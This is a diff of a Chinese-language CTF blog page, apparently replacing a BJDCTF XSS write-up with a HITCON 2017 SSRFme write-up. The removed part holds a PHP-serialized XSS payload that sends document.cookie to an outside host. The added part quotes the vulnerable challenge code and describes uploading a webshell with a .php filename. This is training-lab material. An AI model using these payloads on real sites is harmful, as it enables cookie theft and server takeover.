@@ -2,21 +2,20 @@
   <head>
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>[BJDCTF 2nd]xss之光 | ev11ccaatt</title>
+<title>[HITCON 2017]SSRFme | ev11ccaatt</title>
 <link rel="shortcut icon" href="https://ev11ccaatt.github.io/favicon.ico?v=1623932293984">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://ev11ccaatt.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="[BJDCTF 2nd]xss之光 | ev11ccaatt - Atom Feed" href="https://ev11ccaatt.github.io/atom.xml">
+<link rel="alternate" type="application/atom+xml" title="[HITCON 2017]SSRFme | ev11ccaatt - Atom Feed" href="https://ev11ccaatt.github.io/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
 
-    <meta name="description" content="进去没有信息，抓个包看下，当时第一是发现 Server: openresty 找了几个payload看了下，貌似不是这里。
-那么还是老办法吧，扫目录。
-开奖了，有git文件泄露.
-发现就一个文件
-&lt;?php
-$a = $_GET['y..." />
+    <meta name="description" content="这个我先是用非预期做出来，然后觉得不对头，才去看的wp
+先上源码
+222.18.127.252 &lt;?php
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $htt..." />
     <meta name="keywords" content="" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
     <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
@@ -79,40 +78,64 @@ $a = $_GET['y..." />
         <div class="post-detail">
           <article class="post">
             <h2 class="post-title">
-              [BJDCTF 2nd]xss之光
+              [HITCON 2017]SSRFme
             </h2>
             <div class="post-info">
               <span>
-                2021-04-06
+                2021-06-17
               </span>
               <span>
-                1 min read
+                2 min read
               </span>
               
             </div>
             
             <div class="post-content-wrapper">
               <div class="post-content">
-                <p>进去没有信息，抓个包看下，当时第一是发现 Server: openresty 找了几个payload看了下，貌似不是这里。</p>
-<p>那么还是老办法吧，扫目录。</p>
-<p>开奖了，有git文件泄露.</p>
-<p>发现就一个文件</p>
-<pre><code>&lt;?php
-$a = $_GET['yds_is_so_beautiful'];
-echo unserialize($a);
+                <p>这个我先是用非预期做出来，然后觉得不对头，才去看的wp</p>
+<p>先上源码</p>
+<pre><code class="language-php">222.18.127.252 &lt;?php
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
+    }
+
+    echo $_SERVER[&quot;REMOTE_ADDR&quot;];
+
+    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+
+    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));
+    $info = pathinfo($_GET[&quot;filename&quot;]);
+    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));
+    @mkdir($dir);
+    @chdir($dir);
+    @file_put_contents(basename($info[&quot;basename&quot;]), $data);
+    highlight_file(__FILE__);
 </code></pre>
-<p>一番搜索发现是php原生类的利用,<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p>
-<p>由于是php5.6那么构造</p>
-<pre><code>&lt;?php
-$a = new Exception(&quot;&lt;script&gt;window.open('http://99cb3fc4-b241-4edb-aa24-b550de1ef186.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;&quot;);
-$b = serialize($a);
-echo urlencode($b);
-</code></pre>
-<p>即可，传入后在cookie可以看到flag.</p>
+<p>前面那个是ip，</p>
+<p>sandbox则是文件上传的地方</p>
+<h2 id="非预期">非预期</h2>
+<p>这个对上传文件没有任何过滤，那么可以考虑传个🐎过去，传的时候用png之类的🐎，php的话，写成明文也能传，然后</p>
+<p>记得把filename的后缀改成php，这样才会解析</p>
+<p>传过去就能直接上🐎</p>
+<h2 id="预期">预期</h2>
+<p>[2.7 <a href="https://da4er.top/2-7-HITCON-2017-SSRFme.html">HITCON 2017]SSRFme - Da4er's Blogs</a></p>
+<p>在这里有详解，但是要注意不能用 /bin/bash 这样的话会在读取的时候/被当成目录路径，然后需要 -c 因为需要将/readflag中的内容当作shell来执行</p>
+<p>。</p>
 
               </div>
               <div class="toc-container">
-                
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">非预期</a></li>
+<li><a href="#%E9%A2%84%E6%9C%9F">预期</a></li>
+</ul>
+</li>
+</ul>
+
               </div>
             </div>
           </article>
@@ -121,9 +144,9 @@ echo urlencode($b);
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://ev11ccaatt.github.io/post/bjdctf-2ndjian-dan-zhu-ru/">
+            <a href="https://ev11ccaatt.github.io/post/xctf-final/">
               <h3 class="post-title">
-                [BJDCTF 2nd]简单注入
+                xctf final 
               </h3>
             </a>
           </div>
